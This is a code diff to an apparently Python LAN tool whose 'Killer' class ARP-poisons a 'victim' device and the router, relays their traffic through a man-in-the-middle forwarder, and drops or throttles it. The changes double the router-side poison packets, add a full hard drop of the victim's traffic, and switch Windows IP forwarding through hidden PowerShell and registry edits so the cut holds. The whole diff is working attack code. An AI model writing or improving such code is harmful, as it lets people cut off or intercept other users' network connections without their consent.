@@ -25,6 +25,64 @@ from constants import *
 from tools.crash_feedback import safe_daemon_target
 
 
+def _set_windows_ip_forwarding(enabled: bool) -> None:
+    """Runtime + persistent IPv4 forwarding toggle (Windows).
+
+    ``netsh interface ipv4 set global forwarding=…`` is **invalid** — forwarding is
+    per-interface. Use Set-NetIPInterface so Kill's userspace drop is not bypassed
+    by the kernel still routing redirected frames.
+    """
+    if not sys.platform.startswith('win'):
+        return
+    want = 1 if enabled else 0
+    flag = 'Enabled' if enabled else 'Disabled'
+    try:
+        try:
+            import winreg
+
+            key = winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE,
+                r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
+                0,
+                winreg.KEY_SET_VALUE,
+            )
+            winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, want)
+            winreg.CloseKey(key)
+        except Exception:
+            run_command(
+                [
+                    'powershell',
+                    '-NoProfile',
+                    '-WindowStyle',
+                    'Hidden',
+                    '-Command',
+                    "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
+                    f"-Name 'IPEnableRouter' -Value {want} -Type DWord -Force",
+                ],
+                shell=False,
+                timeout=12,
+            )
+        # Per-interface runtime switch (no reboot). Global netsh forwarding= is a no-op/error.
+        run_command(
+            [
+                'powershell',
+                '-NoProfile',
+                '-WindowStyle',
+                'Hidden',
+                '-Command',
+                'Get-NetIPInterface -AddressFamily IPv4 -ErrorAction SilentlyContinue | '
+                'ForEach-Object { '
+                'Set-NetIPInterface -InterfaceIndex $_.InterfaceIndex '
+                f"-AddressFamily IPv4 -Forwarding {flag} -ErrorAction SilentlyContinue "
+                '}',
+            ],
+            shell=False,
+            timeout=20,
+        )
+    except Exception:
+        pass
+
+
 def is_ip_forwarding_enabled() -> bool:
     """True when Windows kernel/global IPv4 forwarding is on (breaks MITM cut if forwarder absent)."""
     if not sys.platform.startswith('win'):
@@ -46,7 +104,26 @@ def is_ip_forwarding_enabled() -> bool:
         pass
     try:
         out = run_command(
-            ['netsh', 'interface', 'ipv4', 'show', 'config'],
+            [
+                'powershell',
+                '-NoProfile',
+                '-WindowStyle',
+                'Hidden',
+                '-Command',
+                "(Get-NetIPInterface -AddressFamily IPv4 -ErrorAction SilentlyContinue | "
+                "Where-Object { $_.Forwarding -eq 'Enabled' } | Measure-Object).Count",
+            ],
+            shell=False,
+            timeout=12,
+        )
+        text = str(out or '').strip()
+        if text.isdigit() and int(text) > 0:
+            return True
+    except Exception:
+        pass
+    try:
+        out = run_command(
+            ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
             shell=False,
             timeout=8,
         )
@@ -59,69 +136,13 @@ def is_ip_forwarding_enabled() -> bool:
 
 
 def enable_ip_forwarding():
-    """Enable kernel IP forwarding (Windows: IPEnableRouter + netsh). No-op on other OSes."""
-    if not sys.platform.startswith('win'):
-        return
-    try:
-        try:
-            import winreg
-
-            key = winreg.OpenKey(
-                winreg.HKEY_LOCAL_MACHINE,
-                r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
-                0,
-                winreg.KEY_SET_VALUE,
-            )
-            winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, 1)
-            winreg.CloseKey(key)
-        except Exception:
-            run_command(
-                [
-                    'powershell',
-                    '-NoProfile',
-                    '-WindowStyle',
-                    'Hidden',
-                    '-Command',
-                    "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
-                    "-Name 'IPEnableRouter' -Value 1 -Type DWord -Force",
-                ],
-                shell=False,
-                timeout=12,
-            )
-        run_command(
-            ['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'],
-            shell=False,
-            timeout=12,
-        )
-    except Exception:
-        pass
+    """Enable kernel IP forwarding (Windows: IPEnableRouter + per-iface Set-NetIPInterface)."""
+    _set_windows_ip_forwarding(True)
 
 
 def disable_ip_forwarding():
     """Disable kernel IP forwarding so MITM forwarder is the only relay path."""
-    if not sys.platform.startswith('win'):
-        return
-    try:
-        try:
-            import winreg
-
-            key = winreg.OpenKey(
-                winreg.HKEY_LOCAL_MACHINE,
-                r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
-                0,
-                winreg.KEY_SET_VALUE,
-            )
-            winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, 0)
-            winreg.CloseKey(key)
-        except Exception:
-            pass
-        run_command(
-            ['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=disabled'],
-            shell=False,
-            timeout=12,
-        )
-    except Exception:
-        pass
+    _set_windows_ip_forwarding(False)
 
 
 class Killer:
@@ -129,8 +150,9 @@ class Killer:
         self.iface = get_default_iface()
         # Use guid (Scapy/pcap name) for conf.iface, not friendly name
         conf.iface = self.iface.guid if self.iface.guid else self.iface.name
-        # Enable kernel IP forwarding for fast MITM
-        enable_ip_forwarding()
+        # Home-LAN Kill/Lag uses the userspace MitmForwarder. Leaving kernel
+        # forwarding ON lets Windows relay redirected frames and makes Kill only
+        # partial. Clumsy/ICS enables forwarding itself when needed.
         self.router = router
         self.killed = {}
         self.storage = {}
@@ -506,7 +528,16 @@ class Killer:
             pdst=self.router['ip'],
             hwdst=self.router['mac'],
         )
-        return [to_victim_req, to_victim_reply, to_router_req, to_router_reply]
+        # Router ARP recovers faster from direct victim frames — send router-side
+        # poison twice per burst so inbound MITM (full Kill) holds with outbound.
+        return [
+            to_victim_req,
+            to_victim_reply,
+            to_router_req,
+            to_router_reply,
+            to_router_req,
+            to_router_reply,
+        ]
 
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
         """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.
@@ -607,14 +638,16 @@ class Killer:
             return False
         self._get_socket()
         disable_ip_forwarding()
+        # Full Kill (0%): hard-drop both directions in addition to pass ratio.
+        hard_drop = pass_percent <= 0
         fw = MitmForwarder(debug=debug)
         fw.start(
             victim=victim,
             router=self.router,
             iface_name=tokens[0],
             iface_mac=self.iface.mac,
-            drop_from_victim=False,
-            drop_to_victim=False,
+            drop_from_victim=hard_drop,
+            drop_to_victim=hard_drop,
             pass_from_victim_pct=pass_from_victim,
             pass_to_victim_pct=pass_to_victim,
             iface_alts=tokens[1:],
@@ -974,8 +1007,10 @@ class Killer:
         fw = self.forwarders.pop(mac, None)
         if fw:
             fw.stop()
+        # Keep kernel forwarding OFF when idle so the next Kill cannot leak through
+        # a failed disable. Clumsy/ICS turns forwarding on when that path needs it.
         if not self.forwarders and not self.killed:
-            enable_ip_forwarding()
+            disable_ip_forwarding()
 
     def _enforce_pf_block(self, victim_ip: str):
         if victim_ip in self.pf_blocks:
